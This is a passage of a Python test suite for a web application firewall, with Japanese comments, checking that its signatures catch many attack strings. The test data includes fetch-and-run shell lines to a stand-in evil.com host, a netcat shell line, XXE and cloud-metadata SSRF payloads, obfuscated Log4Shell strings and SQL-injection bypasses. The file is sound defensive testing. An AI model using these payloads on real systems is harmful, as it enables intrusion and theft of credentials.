    bs = chr(92)                                            # バックスラッシュ(\u/\x をソースに直書きしない)
    assert "xss" in hits("".join(bs + "u%04x" % ord(c) for c in "<script>"))  # \uXXXX
    assert "xss" in hits("".join(bs + "x%02x" % ord(c) for c in "<script>"))  # \xXX
    # benign Unicode(日本語/絵文字/全角/アクセント)は誤検知しない
    for s in ["?q=こんにちは", "?name=café",
              "?e=\U0001F44D\U0001F389", "?city=Ｔｏｋｙｏ"]:
        assert hits(s) == set(), s


def test_ssi_ldap_mailheader_and_obfuscated_loopback():
    # evolution #2 深掘り(隠していた小粒): SSI/LDAP/メールヘッダ注入=低FP常時ON、
    # 難読化ループバック SSRF と ${...} SSTI は ssrf_internal/ssti(オプション)に統合。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    assert rgx["ssi"].search(_normalize_for_scan('x=<!--#exec cmd="id"-->'))          # SSI
    assert rgx["ldapi"].search(_normalize_for_scan("u=admin)(|(uid=*))"))             # LDAP
    assert rgx["ldapi"].search(_normalize_for_scan("u=*)(uid=*)"))
    assert rgx["crlf"].search(_normalize_for_scan("to=a%0aBcc:evil@x"))               # mail header
    # 難読化ループバック / ${...}SSTI は optional regex として当たる(評価は cfg ON 時のみ)
    assert rgx["ssrf_internal"].search(_normalize_for_scan("u=http://0x7f000001/x"))
    assert rgx["ssrf_internal"].search(_normalize_for_scan("u=http://2130706433/x"))
    assert rgx["ssti"].search(_normalize_for_scan("z=${7*7}"))
    # 低誤検知: (a)(b) / ${user.name} / 部分10進 / 0xFF / 通常コメントは flag しない
    for s in ["?math=(a)(b)", "?n=${user.name}", "?ver=2130706", "?hex=0xFF", "?c=<!-- hi -->"]:
        b = _normalize_for_scan(s)
        assert not any(rgx[n].search(b) for n in ("ssi", "ldapi", "crlf", "ssrf_internal", "ssti")), s


def test_shellshock_php_ognl_traversal_extensions_and_redirect_optional():
    # evolution #2 深掘り(在庫払底): Shellshock/PHPコード/OGNL/追加LFI標的=低FP常時ON、
    # オープンリダイレクト(=//)=高FPオプション。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    assert rgx["rce"].search(_normalize_for_scan("ua=() { :;}; /bin/cat /etc/x"))   # Shellshock
    assert rgx["rce"].search(_normalize_for_scan("x=<?php system(1)?>"))            # PHP code
    assert rgx["rce"].search(_normalize_for_scan("x=<?= 1 ?>"))
    assert rgx["ognl"].search(_normalize_for_scan("x=%{(#_memberAccess[1]=1)}"))    # OGNL/Struts2
    assert rgx["ognl"].search(_normalize_for_scan("x=@java.lang.Runtime@getRuntime()"))
    assert rgx["traversal"].search(_normalize_for_scan("f=/etc/shadow"))
    assert rgx["traversal"].search(_normalize_for_scan("p=/x/..;/manager/html"))    # Tomcat ..;/
    assert rgx["traversal"].search(_normalize_for_scan("f=win.ini"))
    # 低誤検知: <?xml 宣言 / darwin.ini / runtime 単語 / report.ini は flag しない
    for s in ["?q=<?xml version=1?>", "?file=darwin.ini", "?name=runtime", "?file=report.ini"]:
        b = _normalize_for_scan(s)
        assert not rgx["rce"].search(b) and not rgx["ognl"].search(b) and not rgx["traversal"].search(b), s
    # オープンリダイレクト(=//)は既定OFF、有効化で検知。良性 //cdn 参照を既定で誤遮断しない。
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        assert sh.inspect("203.0.113.80", path="/", query="next=//evil.com/x").get("action") == "allow"
        assert sh.set_optional_signature("redirect", True).get("ok") is True
        assert sh.inspect("203.0.113.81", path="/", query="next=//evil.com/x").get("action") != "allow"


def test_spring4shell_always_on_and_optional_sigs_toggle():
    # evolution #2 深掘り: Spring4Shell(class.module.classLoader)は低FP=常時ON。
    # SSTI / 内部SSRF は高FP=既定OFF・cfg で個別に検知対象/非対象を選べる。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    assert dict(_SIG_RE)["proto"].search(_normalize_for_scan("x=class.module.classLoader.y"))
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # 既定: 高FPシグネチャは OFF → inspect でヒットしない(良性テンプレ/内部IPを誤遮断しない)
        assert sh.inspect("203.0.113.70", path="/", query="n={{7*7}}").get("action") == "allow"
        assert sh.inspect("203.0.113.71", path="/", query="u=http://127.0.0.1/x").get("action") == "allow"
        info = sh.list_signatures()
        assert {b["name"]: b["enabled"] for b in info["builtin"]}["ssti"] is False
        assert "ssti" in info["optional_signatures"]
        # ON にすると検知される(検知対象に選択)
        assert sh.set_optional_signature("ssti", True).get("ok") is True
        assert sh.set_optional_signature("ssrf_internal", True).get("ok") is True
        assert sh.inspect("203.0.113.72", path="/", query="n={{7*7}}").get("action") != "allow"
        assert sh.inspect("203.0.113.73", path="/", query="u=http://127.0.0.1/x").get("action") != "allow"
        # 非対象に戻せる + 設定は永続化(別インスタンスでも OFF が復元)
        assert sh.set_optional_signature("ssti", False).get("ok") is True
        assert sh.inspect("203.0.113.74", path="/", query="n={{7*7}}").get("action") == "allow"
        assert sh.set_optional_signature("unknown", True).get("ok") is False
        sh2 = ND.NetShield(state_dir=tmp)
        sh2.enable()
        # ssrf_internal は True で永続化済み
        assert sh2.inspect("203.0.113.75", path="/", query="u=http://127.0.0.1/x").get("action") != "allow"


def test_crlf_header_injection_and_xxe_are_caught():
    # evolution #2 深掘り(小粒): CRLF/レスポンスヘッダ注入(%0d%0aSet-Cookie:…)と XXE(<!ENTITY…)。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    for s in ["next=%0d%0aSet-Cookie:%20sid=evil", "u=%0d%0aLocation:%20http://e",
              "x=%0d%0aContent-Type:%20text/html"]:
        assert rgx["crlf"].search(_normalize_for_scan(s)), s
    for s in ['d=<!ENTITY xxe SYSTEM "file:///etc/passwd">',
              'x=<!DOCTYPE r [<!ENTITY a SYSTEM "http://e">]',
              'y=<!DOCTYPE foo SYSTEM "http://evil/x.dtd">']:
        assert rgx["xxe"].search(_normalize_for_scan(s)), s
    # 低誤検知: ?location=/ Cookie名/ <!DOCTYPE html>(system無し)/ Content-Type 値は flag しない
    for s in ["?location=tokyo", "?set=1&cookie=2", "?html=<!DOCTYPE html>", "?type=text/html"]:
        assert not rgx["crlf"].search(_normalize_for_scan(s)), s
        assert not rgx["xxe"].search(_normalize_for_scan(s)), s


def test_proto_pollution_and_extra_xss_schemes_are_caught():
    # evolution #2 深掘り(小粒): プロトタイプ汚染(__proto__/constructor…prototype)と
    # data:text/html / vbscript: の XSS スキームを捕捉。いずれも低誤検知。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    for s in ["?__proto__[admin]=1", "?a[constructor][prototype][x]=1",
              "obj.constructor.prototype.x=1"]:
        assert rgx["proto"].search(_normalize_for_scan(s)), s
    for s in ["src=data:text/html;base64,PHNjcmlwdD4=", "href=vbscript:msgbox(1)"]:
        assert rgx["xss"].search(_normalize_for_scan(s)), s
    # 低誤検知: 単語 constructor/prototype 単独・data:image・proto という語は flag しない
    for s in ["?name=constructor", "?type=prototype-demo", "?img=data:image/png;base64,iVBOR",
              "?proto=https"]:
        assert not rgx["proto"].search(_normalize_for_scan(s)), s
        assert not rgx["xss"].search(_normalize_for_scan(s)), s


def test_ssrf_cloud_metadata_is_caught():
    # evolution #2 深掘り: SSRF クラウドメタデータ(IMDS 169.254.169.254 等)= 資格情報窃取の的。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    ssrf = dict(_SIG_RE)["ssrf"]
    for s in ["url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
              "next=http://metadata.google.internal/computeMetadata/v1/",
              "target=http://100.100.100.200/latest/meta-data/",
              "u=http://[fd00:ec2::254]/latest/meta-data/"]:
        assert ssrf.search(_normalize_for_scan(s)), s
    # 部分一致や正規の内部IP・パスは誤検知しない
    for s in ["?ip=192.168.1.10", "?host=10.0.0.1", "?ver=169.254", "?path=/latest/news"]:
        assert not ssrf.search(_normalize_for_scan(s)), s


def test_attacks_in_non_ua_headers_are_scanned():
    # evolution #2 深掘り: Log4Shell/SQLi は Referer/X-Forwarded-For/Cookie 等あらゆるヘッダから
    # 来る。inspect が headers も走査面に含め、proxy が攻撃者制御ヘッダ値を集約することを実証。
    import tempfile
    from dataplane.engine.services.proxy import _scan_header_values
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # ヘッダ経由の各攻撃が検知される(action は allow ではない)
        for hv in ["x=${jndi:ldap://e/a}", "ref=1 union select a from b where c=1",
                   "c=1;cat /etc/passwd", "id[$ne]=1"]:
            d = sh.inspect("203.0.113.50", path="/", headers=hv)
            assert d.get("action") != "allow", (hv, d)
        # 良性なヘッダ値は通す
        assert sh.inspect("203.0.113.51", path="/",
                          headers="https://ref/p?a=1 1.2.3.4 sid=abcdef").get("action") == "allow"
    # 集約器は Referer/XFF/Cookie + Accept*(攻撃者制御=Log4Shell の運び手・#41 で走査対象に)を拾い、
    # Host/User-Agent は除外する(inspect が別フィールドとして走査=二重走査回避)。
    buf = (b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: UA\r\nAccept: text/html\r\n"
           b"Referer: http://r/p\r\nX-Forwarded-For: 1.2.3.4\r\nCookie: s=abc\r\n\r\n")
    got = _scan_header_values(buf)
    assert "http://r/p" in got and "1.2.3.4" in got and "s=abc" in got
    assert "text/html" in got                          # #41: Accept* も走査対象に含める
    assert "UA" not in got and "x" not in got.split()  # Host/UA は集約から除外(別途走査)


def test_redos_custom_signature_blocked_at_compile_time():
    # evolution #2 深掘り: カスタム署名の検証は add_signature だけでなく *コンパイル時* にも効かせ、
    # 改竄/レガシーな署名ファイル経由の ReDoS パターンを live エンジンへ載せない(自己DoS防止)。
    import json
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        with open(sh._sig_path, "w", encoding="utf-8") as f:    # add_signature を通さず直接書く
            json.dump({"signatures": [
                {"name": "evil", "pattern": r"(a+)+$", "weight": 40, "enabled": True},
                {"name": "evil2", "pattern": r"(.*)*x", "weight": 40, "enabled": True},
                {"name": "good", "pattern": r"evilbot", "weight": 40, "enabled": True},
            ]}, f)
        sh._load_sigs()
        live = [c[0] for c in sh._custom_re]
        assert live == ["good"], live                # 危険2件は除外、安全1件のみ live
        assert sh._custom_blocked == 2
        assert sh.list_signatures()["custom_blocked"] == 2
    # add_signature の API 側検証も従来どおり効く
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        assert sh.add_signature("z", r"(a+)+$").get("ok") is False


def test_xss_event_handler_and_nested_jndi_are_caught():
    # evolution #2 深掘り(全部): タグ内 onXxx= のハンドラ型 XSS と、Log4Shell の入れ子難読化。
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, _xss_event_handler_suspect)
    jndi = dict(_SIG_RE)["jndi"]
    # ハンドラ型 XSS(個別ハンドラ名を列挙せず構造で捕捉)
    for s in ["<svg onload=alert(1)>", "<body onload=alert(1)>", "<a onmouseover=alert(1)>",
              "<div onclick=alert(1)>", "<svg/onload=alert(1)>", "<details ontoggle=alert(1)>",
              "<input onfocus=alert(1) autofocus>", "<marquee onstart=alert(1)>"]:
        assert _xss_event_handler_suspect(_normalize_for_scan(s)), s
    # 低誤検知: <タグ を伴わない素の引数や、ハンドラ無しのタグは flag しない
    for s in ["?onload=1", "?q=onclick+demo", "<p>hello world</p>", "?title=Mr. Bond"]:
        assert not _xss_event_handler_suspect(_normalize_for_scan(s)), s
    # Log4Shell 入れ子難読化(${lower:j} / ${::-j} / ${upper:i} / ${env:X:-j})を jndi: として露出
    for s in ["${jndi:ldap://e/a}", "${${lower:j}ndi:ldap://e/a}",
              "${${::-j}${::-n}${::-d}${::-i}:ldap://e}", "${jnd${upper:i}:rmi://h}",
              "${${env:FOO:-j}ndi:dns://x}"]:
        assert jndi.search(_normalize_for_scan(s)), s
    # benign テンプレート(${cart.total} 等)は jndi として誤検知しない
    for s in ["?price=${cart.total}", "?t=${user.name}", "?d=${date:yyyy}"]:
        assert not jndi.search(_normalize_for_scan(s)), s


def test_new_attack_classes_blind_sqli_nosql_lfi_jndi():
    # evolution #2 深掘り(全部): union/恒真式に出ない別系統の攻撃クラスを追加で捕捉。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    def hits(p):
        b = _normalize_for_scan(p)
        return {n for n, r in _SIG_RE if r.search(b)}
    assert "sqli_blind" in hits("1 and sleep(5)")
    assert "sqli_blind" in hits("1;waitfor delay '0:0:5'")
    assert "sqli_blind" in hits("1 and extractvalue(1,concat(0x7e,version()))")
    assert "sqli_blind" in hits("x into outfile '/tmp/a'")
    assert "nosqli" in hits("id[$ne]=1")
    assert "nosqli" in hits('{"$where":"1==1"}')
    assert "lfi" in hits("file=php://filter/resource=index")
    assert "lfi" in hits("url=gopher://127.0.0.1:6379")
    assert "jndi" in hits("x=${jndi:ldap://evil/a}")
    # 低誤検知: PHP/Rails の配列添字($接頭なし)、英単語 sleepy、通常 https は flag しない
    for benign in ["filter[name]=bob", "?items[0]=x&items[1]=y", "?q=sleepy+town",
                   "https://example.com/path", "/files/report.pdf", "?sort=name&page=2"]:
        assert hits(benign) == set(), (benign, hits(benign))


def test_union_select_separator_evasion_is_caught():
    # evolution #2 深掘り: UNION SELECT の間を括弧/ALL/DISTINCT で割る定番回避
    # (UNION(SELECT…) / UNION ALL SELECT)を構造で捕捉する。空白限定を卒業。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    sqli = dict(_SIG_RE)["sqli"]
    for s in ["1 union select a from b", "1 union(select(a)from(b))",
              "1 union all select a", "1 union distinct select a",
              "1/*!union*/(/*!select*/a)", "1 union  (  select a"]:
        assert sqli.search(_normalize_for_scan(s)), s
    # 語境界つきなので benign(英単語に union/select を含む)は誤検知しない
    for s in ["?q=onion+rings", "?genre=fusion&type=selection",
              "/union-station/select-menu"]:
        assert not sqli.search(_normalize_for_scan(s)), s


def test_mysql_versioned_comment_evasion_is_caught():
    # evolution #2 深掘り: MySQL 版付きコメント /*!...*/ は DB が中身を実行する。一般コメントと
    # 同様に中身ごと消すと UNION 等が検出から消える(sqlmap versionedkeywords 回避)。囲みだけ
    # 剥がして中身を残すことで捕捉する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    sqli = dict(_SIG_RE)["sqli"]
    for s in ["1/*!50000UNION*/SELECT/*!password*/FROM/**/users WHERE a=1",
              "/*!UNION*//*!SELECT*/1 from a where b=1",
              "1/*!50000UNION*//*!50000SELECT*/pass FROM u WHERE a=1"]:
        assert sqli.search(_normalize_for_scan(s)), s
    # 一般コメントの除去は維持(中身は無害化)・benign は誤検知しない
    assert sqli.search(_normalize_for_scan("1/**/UNION/**/SELECT a from b where c=1"))
    for s in ["desc=2*3/*note*/", "?a=1&b=2", "/path/to/page"]:
        assert not any(r.search(_normalize_for_scan(s)) for _n, r in _SIG_RE), s


def test_newline_injected_separator_is_caught():
    # evolution #2 深掘り: %0a/%0d で注入した改行はサーバ側でコマンド/文の区切りになる。
    # 区切り ; へ正規化し、; ベースの既存検知(RCE/stacked SQL)が改行注入にも効くことを実証。
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, _stacked_query_suspect)
    rgx = dict(_SIG_RE)
    # 改行で区切られたコマンド注入 → RCE として捕捉(従来は \s 畳みで素通り)
    for s in ["127.0.0.1%0acat /etc/passwd", "127.0.0.1%0d%0awget x", "a%0a%0d;bash"]:
        assert rgx["rce"].search(_normalize_for_scan(s)), s
    # 改行で区切られた複文 SQL → stacked として捕捉
    assert _stacked_query_suspect(_normalize_for_scan("q%0a%0aselect a from b"))
    # 正規の生改行を持たない通常の query は影響を受けない(誤検知しない)
    for s in ["?a=1&b=2", "/index.html", "?q=hello+world&sort=name", "user=alice&id=42"]:
        b = _normalize_for_scan(s)
        assert not any(r.search(b) for _n, r in _SIG_RE), s


def test_html_entity_encoded_xss_is_decoded_and_caught():
    # evolution #2 深掘り: 実体エンコード(&lt; / &#60; / &#x3c;)で XSS シグネチャを
    # すり抜ける回避を、;終端エンティティの復号で無効化する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    xss = dict(_SIG_RE)["xss"]
    evade = ["&lt;script&gt;alert(1)", "&#60;script&#62;", "&#x3c;script&#x3e;",
             "%26lt%3bscript%26gt%3b",                # 二重符号化(%→&lt;→<)も貫通
             "&lt;img src=x onerror=1&gt;"]
    for s in evade:
        assert xss.search(_normalize_for_scan(s)), s   # 復号後に XSS として捕捉
    # ;の無い legacy 実体は復号しない=REST フィルタ引数(gt/lt)を誤検知しない
    for s in ["?price_gt=10&price_lt=100", "?lt=100&gt=10", "?a=1&sort=name",
              "user=alice&id=42", "?q=fish&chips"]:
        assert not xss.search(_normalize_for_scan(s)), s


def test_http_smuggling_framing_is_rejected():
    # ルート1(HTTPリクエストスマグリング): 曖昧な本文境界を構造で検出して拒否(evolution #5)。
    from dataplane.engine.services.proxy import _framing_ambiguous
    H = b"POST / HTTP/1.1\r\nHost: x\r\n"
    clte = (H + b"Content-Length: 43\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"0\r\n\r\nGET /.env HTTP/1.1\r\n\r\n")
    bad = {
        "CL.TE": clte,
        "dup-CL": H + b"Content-Length: 5\r\nContent-Length: 6\r\n\r\n",
        "bare-LF": H + b"Content-Length: 5\nTransfer-Encoding: chunked\r\n\r\n",
        "CL-hex": H + b"Content-Length: 0x10\r\n\r\n",
        "CL-sign": H + b"Content-Length: +5\r\n\r\n",
        "CL-comma": H + b"Content-Length: 5, 5\r\n\r\n",
        "TE.TE": H + b"Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n",
        "TE-not-last-chunked": H + b"Transfer-Encoding: chunked, gzip\r\n\r\n",
        "TE-identity": H + b"Transfer-Encoding: identity\r\n\r\n",
        "name-space-CL": H + b"Content-Length : 5\r\n\r\n",
        # 深掘り(行構造・ヘッダ整合性)
        "bare-CR": H + b"Content-Length: 5\rTransfer-Encoding: chunked\r\n\r\n",
        "obs-fold": H + b"Transfer-Encoding: chunked\r\n , x\r\n\r\n",
        "dup-Host": H + b"Host: evil\r\n\r\n",
        "reqline-2space": b"POST  / HTTP/1.1\r\nHost: x\r\n\r\n",
        "reqline-badver": b"POST / HTTP/2.0\r\nHost: x\r\n\r\n",
        "reqline-badmethod": b"GE+T / HTTP/1.1\r\nHost: x\r\n\r\n",
        "reqline-extra-token": b"GET / HTTP/1.1 x\r\nHost: x\r\n\r\n",
        # 深掘り step3(Host 必須 / NUL)
        "http11-no-host": b"GET / HTTP/1.1\r\nUser-Agent: x\r\n\r\n",
        "nul-in-header": H + b"X: a\x00b\r\n\r\n",
        "nul-in-reqline": b"GET /\x00 HTTP/1.1\r\nHost: x\r\n\r\n",
    }
    for label, raw in bad.items():
        assert _framing_ambiguous(raw) is True, label    # 曖昧 → 拒否
    good = {
        "single-CL": b"GET /index.html HTTP/1.1\r\nHost: x\r\nContent-Length: 10\r\n\r\n",
        "no-body-GET": b"GET / HTTP/1.1\r\nHost: x\r\n\r\n",
        "plain-chunked": H + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
        "te-coding-then-chunked": H + b"Transfer-Encoding: gzip, chunked\r\n\r\n0\r\n\r\n",
        "CL-ows": H + b"Content-Length:  10 \r\n\r\n",   # 値前後のOWSは正常
        "options-star": b"OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n",
        "query-target": b"GET /a?b=c&d=e HTTP/1.0\r\nHost: x\r\n\r\n",
        "single-Host": H + b"Content-Length: 0\r\n\r\n",
        "http10-no-host": b"GET / HTTP/1.0\r\nUser-Agent: x\r\n\r\n",  # 1.0 は Host 任意
    }
    for label, raw in good.items():
        assert _framing_ambiguous(raw) is False, label   # 正常 → 通す


def test_slowloris_penalty_escalates_to_ban_not_on_single():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        ip = "203.0.113.50"
        r1 = sh.penalize(ip, reason="slowloris")
        assert r1["banned"] is False          # 単発では落とさない(正規の低速回線を誤遮断しない)
        banned = False
        for _ in range(5):                    # 反復(score 累積)で BAN へ
            if sh.penalize(ip, reason="slowloris")["banned"]:
                banned = True
                break
        assert banned
        assert ip in sh._ban_bloom            # bloom にも登録=以後 O(1) で瞬殺


def test_async_guard_response_content_length_is_byte_accurate():
    # Gのおっさん対策: 非ASCII本文でも Content-Length は UTF-8 バイト数で厳密一致する。
    from dataplane.engine.services.proxy import _http_response
    raw = _http_response("402 Payment Required", '{"error":"期限切れ"}')
    head, _, body = raw.partition(b"\r\n\r\n")
    import re
    n = int(re.search(rb"Content-Length: (\d+)", head).group(1))
    assert n == len(body)                       # 宣言値 == 実バイト数(文字数ではない)
    assert n == len('{"error":"期限切れ"}'.encode("utf-8"))
    assert n != len('{"error":"期限切れ"}')       # 文字数とは一致しない(=ズレ防止の要)


def test_dashboard_controls():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # shield ON
            _req(url + "/api/shield/toggle", token=token, body={"on": True})
            assert ND._SHIELD.is_enabled() is True
            # firewall deny ルール
            _req(url + "/api/firewall/rule", token=token,
                 body={"net": "203.0.113.0/24", "action": "deny"})
            assert any(r["net"] == "203.0.113.0/24" for r in FW._FW.rules)
            # エッジ前衛設定DL(444を含む)
            code, conf = _req(url + "/api/edge", token=token)
            assert code == 200 and b"ngx.exit(444)" in conf
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_oversized_body_is_capped():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # Content-Length 分を無制限に読まない=メモリ枯渇しない。上限超では本文を
            # 1MiB で打ち切るため、応答(200)か接続リセットのどちらかになる。どちらも
            # 「防御として正常(クラッシュ/ハング/OOM しない)」=どちらでも合格とする。
            big = b'{"on":true,"pad":"' + b"A" * (2 << 20) + b'"}'
            req = urllib.request.Request(
                url + "/api/firewall/toggle", data=big,
                headers={"X-Token": token, "Content-Type": "application/json"},
                method="POST")
            try:
                with urllib.request.urlopen(req, timeout=10) as resp:
                    assert resp.status == 200
            except (ConnectionResetError, ConnectionAbortedError,
                    urllib.error.URLError):
                pass                            # 上限打ち切りに伴うリセットは許容(防御成功)
            # 肝心なのは『サーバが生きている』こと=通常リクエストが直後も通る
            code, _ = _req(url + "/api/state", token=token)
            assert code == 200
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_backend_unreachable_returns_502_and_metric():
    # バックエンド不達は従来『無言TCP切断』で運用者に何も見えなかった(accepted 以外の
    # 指標が動かない=停止に気付けない)。今は標準的な 502 を返し、
    # metrics["backend_unreachable"] を増分することを回帰から守る(このLite版は
    # txnlog を持たないため、上流(DuckNet本体)のテストと違いそちらの検証は無し)。
    import asyncio
    from dataplane.engine.services.proxy import AsyncEdgeGuard

    class _R:
        def __init__(self, data): self._q = [data]
        async def read(self, n=4096): return self._q.pop(0) if self._q else b""

    class _W:
        def __init__(self): self.buf, self.closed = b"", False
        def write(self, b): self.buf += b
        async def drain(self): pass
        def close(self): self.closed = True
        def get_extra_info(self, k, default=None):
            return ("203.0.113.77", 5555) if k == "peername" else default

    g = AsyncEdgeGuard(backend_host="127.0.0.1", backend_port=1)  # 届かないport
    w = _W()
    asyncio.run(g._handle(_R(b"GET /x HTTP/1.1\r\nHost: h\r\n\r\n"), w))
    assert b"502 Bad Gateway" in w.buf.split(b"\r\n", 1)[0]
    assert w.closed
    assert g.metrics["backend_unreachable"] == 1


def test_dashboard_get_broken_source_degrades_one_key_not_whole_state():
    # state() は複数のサブ状態を独立に取得する。1つ(例: top_talkers)が例外を投げても、
    # そのキーだけ degrade し、/api/state 全体は 200 のまま・他のキー(firewall/
    # shield_metrics 等)は正常に返る(=他パネルは無事)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            def _boom(*a, **kw):
                raise RuntimeError("boom-top-talkers")
            orig = ND._SHIELD.top_talkers
            ND._SHIELD.top_talkers = _boom
            try:
                code, body = _req(url + "/api/state", token=token)
                assert code == 200                          # 全体は落ちない
                st = json.loads(body)
                assert st["top"] == []                       # 壊れたキーだけ空へdegrade
                assert "shield_metrics" in st and "error" not in st["shield_metrics"]
                assert "firewall" in st and "error" not in st["firewall"]
            finally:
                ND._SHIELD.top_talkers = orig
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_get_route_exception_returns_clean_error_not_broken_connection():
    # do_GET には do_POST と同等の包括的例外ガードが無かった。state() 以外の GET
    # ルートで丸ごと例外が起きても、ベースHTTPサーバの既定処理(無言で接続を落とす)に
    # 委ねず、500 + {"ok": false, "error": ...} を返す(このLite版に detections は
    # 無いため deception_status を対象にする)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            def _boom(*a, **kw):
                raise RuntimeError("boom-deception")
            adm.deception_status = _boom
            code, body = _req(url + "/api/deception", token=token)
            assert code == 500
            r = json.loads(body)
            assert r["ok"] is False and "boom-deception" in r["error"]
            # 壊れていない他のルートは引き続き正常(ダッシュボード全体は道連れにならない)
            code2, _ = _req(url + "/api/state", token=token)
            assert code2 == 200
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_b1_rce_and_or_pipe_separator_bypass_is_caught():
    # ライブ監査で実証された RCE バイパス: rce シグネチャは従来 ';' のみを区切りとして認識し、
    # '&&'/'||' 連結や nc/bash 以外へのパイプ(curl/wget/sh/python)は素通りしていた。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rce = dict(_SIG_RE)["rce"]
    for s in ["x=1&&wget http://evil.com/x -O /tmp/a&&chmod +x /tmp/a&&/tmp/a",
              "x=1|curl http://evil.com/x|sh",
              "x=1||bash -c id", "x=1&&curl http://evil/x", "x=1|wget http://evil/x",
              "x=1|python -c 'import os'"]:
        assert rce.search(_normalize_for_scan(s)), s
    # 既存の ';' 区切り真陽性は引き続き検知(回帰なし)
    for s in ["x=1;cat /etc/passwd", "x=1|nc 10.0.0.1 4444", "x=1;bash -c id"]:
        assert rce.search(_normalize_for_scan(s)), s
    # プレフィルタが新規バイパス払拭を素通りさせない(自己欺瞞バグの回帰防止)
    import dataplane.engine.core.accel as accel
    for s in ["x=1&&wget http://evil.com/x", "x=1|curl http://evil.com/x|sh"]:
        b = _normalize_for_scan(s)
        assert accel.prescan_suspicious(b.encode("utf-8")) > 0, s


def test_b2_crlf_newline_for_space_bypass_is_caught():
    # ライブ監査で実証: _normalize_for_scan は生CR/LFを ';' に変換する(空白畳み込みより前)ため、
    # \s/\s+ 限定の隣接要求を持つ分岐は改行注入で回避できた。区切り文字クラスへ ';' を追加して塞ぐ。
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, _xss_event_handler_suspect)
    rgx = dict(_SIG_RE)
    assert rgx["sqli"].search(_normalize_for_scan("1;drop\ntable users")), "drop\\ntable"
    assert rgx["sqli_blind"].search(_normalize_for_scan("1\nwaitfor\ndelay '0:0:5'")), "waitfor\\ndelay"
    assert rgx["ssi"].search(_normalize_for_scan("x=<!--#\nprintenv -->")), "ssi newline"
    assert _xss_event_handler_suspect(_normalize_for_scan("<svg\nonload=alert(1)>")), "svg onload newline"
    assert _xss_event_handler_suspect(_normalize_for_scan("<img src=x\nonload=alert(1)>")), "img onload newline"
    # 実スペース区切りの既存真陽性は引き続き検知(回帰なし)
    assert rgx["sqli"].search(_normalize_for_scan("1;drop table users"))
    assert rgx["sqli_blind"].search(_normalize_for_scan("1;waitfor delay '0:0:5'"))
    assert rgx["ssi"].search(_normalize_for_scan('x=<!--#exec cmd="id"-->'))
    assert _xss_event_handler_suspect(_normalize_for_scan("<svg onload=alert(1)>"))


def test_b3_nosqli_json_native_operator_form_is_caught():
    # ライブ監査で実証: Mongo認証バイパスの定番形 {"password":{"$ne":""}} はJSONネイティブの
    # キー形(コロン付き)で、旧nosqliは配列添字形 [$ne] と bare $where しか見ていなかった。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    nosqli = dict(_SIG_RE)["nosqli"]
    for s in ['{"username":"admin","password":{"$ne":""}}',
              '{"age":{"$gt":18}}', "{'$or': [{'a':1}]}", '{"x":{"$regex":".*"}}']:
        assert nosqli.search(_normalize_for_scan(s)), s
    # 既存の配列添字形/bare $where は回帰なし
    for s in ["id[$ne]=1", '{"$where":"1==1"}']:
        assert nosqli.search(_normalize_for_scan(s)), s
    # 誤検知なし: $ を含まない通常JSON、配列添字(PHP/Railsスタイル)
    for s in ['{"name":"bob","price":"$19.99"}', "filter[name]=bob", "?items[0]=x"]:
        assert not nosqli.search(_normalize_for_scan(s)), s


def test_b4_xxe_public_external_id_is_caught():
    # ライブ監査で実証: 標準XMLの PUBLIC 外部識別子形(SYSTEM/<!ENTITY>を含まない)は旧regexの
    # 両分岐(<!entity / doctype...system)いずれにも当たらず素通りしていた。
